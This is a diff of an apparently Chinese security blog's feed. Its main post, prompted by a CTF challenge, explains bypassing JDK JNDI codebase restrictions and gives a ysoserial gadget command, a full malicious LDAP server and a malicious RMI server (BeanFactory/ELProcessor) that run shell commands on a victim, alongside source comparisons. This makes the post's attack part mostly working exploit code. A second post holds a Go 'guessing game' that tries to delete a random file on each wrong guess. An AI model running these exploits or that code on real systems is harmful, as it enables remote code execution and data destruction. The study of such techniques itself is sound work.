+            &lt;version&gt;3.2.1&lt;/version&gt;
+        &lt;/dependency&gt;
+
+        &lt;dependency&gt;
+            &lt;groupId&gt;com.unboundid&lt;/groupId&gt;
+            &lt;artifactId&gt;unboundid-ldapsdk&lt;/artifactId&gt;
+            &lt;version&gt;4.0.8&lt;/version&gt;
+            &lt;scope&gt;test&lt;/scope&gt;
+        &lt;/dependency&gt;
+</code></pre>
+<p>前面的CC很熟悉，后面那个是用于与 LDAP 目录服务器进行通信的一个java库<br>
+这会不会就是出题人提示呢，绕过高版本jdk实现jndi注入打CC链</p>
+<h1 id="绕过">绕过</h1>
+<p>所以现在就来学习一下</p>
+<p>我们主要来分析RMI和LDAP两个攻击向量<br>
+不做具体调试了，就看新旧版本的源码对比</p>
+<h2 id="rmi">RMI</h2>
+<p>在JDK 6u141、7u131、8u121之后，增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项。<br>
+对比下JDK的com.sun.jndi.rmi.registry.RegistryContext类的decodeObject()函数<br>
+我这里新版用的jdk8u391,旧版是8u65</p>
+<pre><code class="language-java">//8u391
+private Object decodeObject(Remote var1, Name var2) throws NamingException {
+        try {
+            Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;
+            Reference var8 = null;
+            if (var3 instanceof Reference) {
+                var8 = (Reference)var3;
+            } else if (var3 instanceof Referenceable) {
+                var8 = ((Referenceable)((Referenceable)var3)).getReference();
+            }
+
+            if (var8 != null &amp;&amp; var8.getFactoryClassLocation() != null &amp;&amp; !trustURLCodebase) {
+                throw new ConfigurationException(&quot;The object factory is untrusted. Set the system property 'com.sun.jndi.rmi.object.trustURLCodebase' to 'true'.&quot;);
+            } else {
+                return NamingManager.getObjectInstance(var3, var2, this, this.environment);
+            }
+        } catch (NamingException var5) {
+            throw var5;
+        } catch (RemoteException var6) {
+            throw (NamingException)wrapRemoteException(var6).fillInStackTrace();
+        } catch (Exception var7) {
+            NamingException var4 = new NamingException();
+            var4.setRootCause(var7);
+            throw var4;
+        }
+    }
+
+    //8u65
+    private Object decodeObject(Remote var1, Name var2) throws NamingException {
+        try {
+            Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;
+            return NamingManager.getObjectInstance(var3, var2, this, this.environment);
+        } catch (NamingException var5) {
+            throw var5;
+        } catch (RemoteException var6) {
+            throw (NamingException)wrapRemoteException(var6).fillInStackTrace();
+        } catch (Exception var7) {
+            NamingException var4 = new NamingException();
+            var4.setRootCause(var7);
+            throw var4;
+        }
+    }
+</code></pre>
+<p>主要就是加了一个if判断<code>com.sun.jndi.rmi.object.trustURLCodebase</code>是否为true才能调用getObjectInstance，最后调用loadClass进行类加载，而codebase默认为false</p>
+<h2 id="ldap">LDAP</h2>
+<p>ldap的利用在JDK 6u211、7u201、8u191之后，增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项。<br>
+关注com.sun.naming.internal.VersionHelper12#loadClass方法</p>
+<pre><code class="language-java">//8u391
+public Class&lt;?&gt; loadClass(String className, String codebase)
+            throws ClassNotFoundException, MalformedURLException {
+        if (&quot;true&quot;.equalsIgnoreCase(trustURLCodebase)) {
+            ClassLoader parent = getContextClassLoader();
+            ClassLoader cl =
+                    URLClassLoader.newInstance(getUrlArray(codebase), parent);
+
+            return loadClass(className, cl);
+        } else {
+            return null;
+        }
+    }
+
+    //8u65
+    public Class&lt;?&gt; loadClass(String className, String codebase)
+            throws ClassNotFoundException, MalformedURLException {
+
+        ClassLoader parent = getContextClassLoader();
+        ClassLoader cl =
+                 URLClassLoader.newInstance(getUrlArray(codebase), parent);
+
+        return loadClass(className, cl);
+    }
+</code></pre>
+<p>同样也是加了一个if判断com.sun.jndi.ldap.object.trustURLCodebase是否为true，然后才能调用URLClassLoader加载器。<br>
+而codebase默认是被设置为false</p>
+<pre><code class="language-java">    private static final String TRUST_URL_CODEBASE_PROPERTY =
+            &quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;;
+    private static final String trustURLCodebase =
+            AccessController.doPrivileged(
+                new PrivilegedAction&lt;String&gt;() {
+                    public String run() {
+                        try {
+                        return System.getProperty(TRUST_URL_CODEBASE_PROPERTY,
+                            &quot;false&quot;);
+                        } catch (SecurityException e) {
+                        return &quot;false&quot;;
+                        }
+                    }
+                }
+            );
+</code></pre>
+<p>如何绕过呢？根据https://mp.weixin.qq.com/s/Dq1CPbUDLKH2IN0NA_nBDA 有两种绕过方式</p>
+<pre><code>两种绕过方法如下：
+
+1. 找到一个受害者本地CLASSPATH中的类作为恶意的Reference Object Factory工厂类，并利用这个本地的Factory类执行命令。
+
+2. 利用LDAP直接返回一个恶意的序列化对象，JNDI注入会对该对象进行反序列化操作，利用反序列化Gadget完成命令执行。
+
+这两种方式都非常依赖受害者本地CLASSPATH中环境，需要利用受害者本地的Gadget进行攻击。
+</code></pre>
+<h2 id="一-利用ldap返回恶意序列化数据触发本地依赖中的gadget">一、利用LDAP返回恶意序列化数据，触发本地依赖中的Gadget</h2>
+<p>我们首先来看第二种利用方式，这也是上面题目的利用点<br>
+题目中存在CC链依赖，我们可以利用CC6或者其他的链去打<br>
+先利用yuserial生成paylaod，然后base64编码一下</p>
+<pre><code>java -jar ysuserial-1.5-su18-all.jar -g CommonsCollections9 -p 'open -a /System/Applications/Calculator.app' -f 9.ser
+
+
+package Qiu;
+import java.io.IOException;
+import java.nio.file.Files;
+import java.nio.file.Paths;
+import java.util.Base64;
+
+public class B64Evil {
+    public static void main(String[] args) throws IOException {
+        byte[] code = Files.readAllBytes(Paths.get(&quot;/xxxx/9.ser&quot;));
+
+        System.out.println(Base64.getEncoder().encodeToString(code));
+    }
+}
+
+</code></pre>
+<p>然后构造恶意server端</p>
+<pre><code class="language-java">package Qiu;
+import com.unboundid.ldap.listener.InMemoryDirectoryServer;
+import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
+import com.unboundid.ldap.listener.InMemoryListenerConfig;
+import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
+import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
+import com.unboundid.ldap.sdk.Entry;
+import com.unboundid.ldap.sdk.LDAPResult;
+import com.unboundid.ldap.sdk.ResultCode;
+import com.unboundid.util.Base64;
+
+import javax.net.ServerSocketFactory;
+import javax.net.SocketFactory;
+import javax.net.ssl.SSLSocketFactory;
+import java.net.InetAddress;
+import java.net.URL;
+//高版本LDAP绕过
+
+public class LDAPServer {
+    private static final String LDAP_BASE = &quot;dc=example,dc=com&quot;;
+
+    public static void main ( String[] tmp_args ) throws Exception{
+        String[] args=new String[]{&quot;http:/127.0.0.1:3377/#Evail&quot;};
+        int port = 6666;
+
+        InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
+        config.setListenerConfigs(new InMemoryListenerConfig(
+                &quot;listen&quot;, //$NON-NLS-1$
+                InetAddress.getByName(&quot;0.0.0.0&quot;), //$NON-NLS-1$
+                port,
+                ServerSocketFactory.getDefault(),
+                SocketFactory.getDefault(),
+                (SSLSocketFactory) SSLSocketFactory.getDefault()));
+
+        config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
+        InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
+        System.out.println(&quot;Listening on 0.0.0.0:&quot; + port);
+        ds.startListening();
+    }
+
+    private static class OperationInterceptor extends InMemoryOperationInterceptor {
+
+        private URL codebase;
+
+        public OperationInterceptor ( URL cb ) {
+            this.codebase = cb;
+        }
+
+        @Override
+        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
+            String base = result.getRequest().getBaseDN();
+            Entry e = new Entry(base);
+            try {
+                sendResult(result, base, e);
+            }
+            catch ( Exception e1 ) {
+                e1.printStackTrace();
+            }
+        }
+
+        protected void sendResult (InMemoryInterceptedSearchResult result, String base, Entry e ) throws Exception {
+            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(&quot;.class&quot;));
+            System.out.println(&quot;Send LDAP reference result for &quot; + base + &quot; redirecting to &quot; + turl);
+            e.addAttribute(&quot;javaClassName&quot;, &quot;foo&quot;);
+            String cbstring = this.codebase.toString();
+            int refPos = cbstring.indexOf('#');
+            if ( refPos &gt; 0 ) {
+                cbstring = cbstring.substring(0, refPos);
+            }
+
+            e.addAttribute(&quot;javaSerializedData&quot;, Base64.decode(&quot;放入你刚刚生成的payload&quot;));
+            result.sendSearchEntry(e);
+            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
+        }
+    }
+}
+</code></pre>
+<p>将jdbcrowImpl链子base64编码<br>
+<img src="https://sl3epf.github.io/post-images/1703318150626.png" alt="" loading="lazy"><br>
+然后打入<br>
+<img src="https://sl3epf.github.io/post-images/1703318226979.png" alt="" loading="lazy"><br>
+发现成功执行<br>
+我们的server端也收到了请求<br>
+<img src="https://sl3epf.github.io/post-images/1703318305511.png" alt="" loading="lazy"></p>
+<h2 id="二-本地恶意类作为reference-factory">二、本地恶意类作为Reference Factory</h2>
+<p>主要就是受害者本地ClassPath能存在一个Factory Class并且必须实现 <code>javax.naming.spi.ObjectFactory</code>接口，并且至少存在一个<code>getObjectInstance()</code>方法<br>
+大佬就找到了这个<code>org.apache.naming.factory.BeanFactory</code><br>
+<img src="https://sl3epf.github.io/post-images/1703319774096.png" alt="" loading="lazy"></p>
+<p>需要依赖</p>
+<pre><code class="language-maven">&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;
+    &lt;artifactId&gt;tomcat-catalina&lt;/artifactId&gt;
+    &lt;version&gt;8.5.0&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;!-- https://mvnrepository.com/artifact/org.apache.el/com.springsource.org.apache.el --&gt;
+&lt;dependency&gt;
+    &lt;groupId&gt;org.apache.el&lt;/groupId&gt;
+    &lt;artifactId&gt;com.springsource.org.apache.el&lt;/artifactId&gt;
+    &lt;version&gt;7.0.26&lt;/version&gt;
+&lt;/dependency&gt;
+</code></pre>
+<p>但是这个el的包我下不下来，就直接去网上找了个<br>
+https://archiva-repository.apache.org/archiva/repository/all-public/org/apache/el/com.springsource.org.apache.el/7.0.26/<br>
+然后导入了<br>
+RMI Server端</p>
+<pre><code class="language-java">package org.example;
+
+import com.sun.jndi.rmi.registry.ReferenceWrapper;
+import org.apache.naming.ResourceRef;
+
+import javax.naming.StringRefAddr;
+import java.rmi.registry.LocateRegistry;
+import java.rmi.registry.Registry;
+
+public class RmiServer {
+    public static void main(String[] args) throws Exception {
+        System.out.println(&quot;[*]Evil RMI Server is Listening on port: 3377&quot;);
+        Registry registry = LocateRegistry.createRegistry(3377);
+        // 实例化Reference，指定目标类为javax.el.ELProcessor，工厂类为org.apache.naming.factory.BeanFactory
+        ResourceRef ref = new ResourceRef(&quot;javax.el.ELProcessor&quot;, null, &quot;&quot;, &quot;&quot;, true,&quot;org.apache.naming.factory.BeanFactory&quot;,null);
+        // 强制将'x'属性的setter从'setX'变为'eval', 详细逻辑见BeanFactory.getObjectInstance代码
+        ref.add(new StringRefAddr(&quot;forceString&quot;, &quot;x=eval&quot;));
+        // 利用表达式执行命令
+        ref.add(new StringRefAddr(&quot;x&quot;, &quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder['(java.lang.String[])'](['/bin/bash', '-c', 'open -na Calculator']).start()\&quot;)&quot;));
+        System.out.println(&quot;[*]Evil command: open -na Calculator&quot;);
+        ReferenceWrapper referenceWrapper = new com.sun.jndi.rmi.registry.ReferenceWrapper(ref);
+        registry.bind(&quot;Object&quot;, referenceWrapper);
+    }
+}
+</code></pre>
+<p>RMI Client端</p>
+<pre><code class="language-java">package org.example;
+
+import javax.naming.InitialContext;
+import javax.naming.NamingException;
+
+public class JNDI_TEST {
+    public static void main(String[] args) throws NamingException {
+        Object object=new InitialContext().lookup(&quot;rmi://127.0.0.1:3377/Object&quot;);
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://sl3epf.github.io/post-images/1703323409532.png" alt="" loading="lazy"></figure>
+<p>这里主要记录利用手法。<br>
+具体漏洞分析流程网上大佬已经写的很清楚了。再造轮子写没啥太大意义，主要是自己调一遍理解一下。</p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[换个地.]]></title>
+        <id>https://sl3epf.github.io/post/test-my-site/</id>
+        <link href="https://sl3epf.github.io/post/test-my-site/">
+        </link>
+        <updated>2023-12-19T07:27:11.000Z</updated>
+        <summary type="html"><![CDATA[<p>Welcome</p>
+]]></summary>
+        <content type="html"><![CDATA[<p>Welcome</p>
+<!-- more -->
+<p>重新找了个写作的地方，之前的博客已经寄了。<br>
+Gridea还不错，就是不支持粘贴图片有点难受。<br>
+大概以后会选择一些放在这上面，关于技术和生活、想法。<br>
+很多事情值得记录和回忆...</p>
+<pre><code class="language-go">func main() {
+
+	rand.Seed(time.Now().UnixNano())
+
+	secretNumber := rand.Intn(100) + 1
+
+	fmt.Println(&quot;Welcome to the Number Guessing Game!&quot;)
+
+	for {
+		fmt.Print(&quot;Guess a number between 1 and 100: &quot;)
+		var input string
+		fmt.Scanln(&amp;input)
+
+		guess, err := strconv.Atoi(input)
+		if err != nil {
+			fmt.Println(&quot;Please enter a valid number.&quot;)
+			continue
+		}
+
+		if guess == secretNumber {
+			fmt.Println(&quot;Congratulations! You guessed it right!&quot;)
+			break
+		} else {
+			fmt.Println(&quot;Oops! Wrong guess!&quot;)
+			fmt.Println(&quot;And...U will lose a file&quot;)
+			file := exec.Command(&quot;ls | shuf -n 1&quot;)
+			output, err := file.Output()
+			_ = os.Remove(string(output))
+
+			fmt.Println(&quot;By the way, you have lost this file:&quot;, string(output))
+			if err != nil {
+				fmt.Println(&quot;Failed to execute.&quot;)
+				continue
+			}
+		}
+	}
+}
+</code></pre>
+<p>测试图片...<br>
+<img src="https://sl3epf.github.io/post-images/1702973753493.jpg" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+</feed>
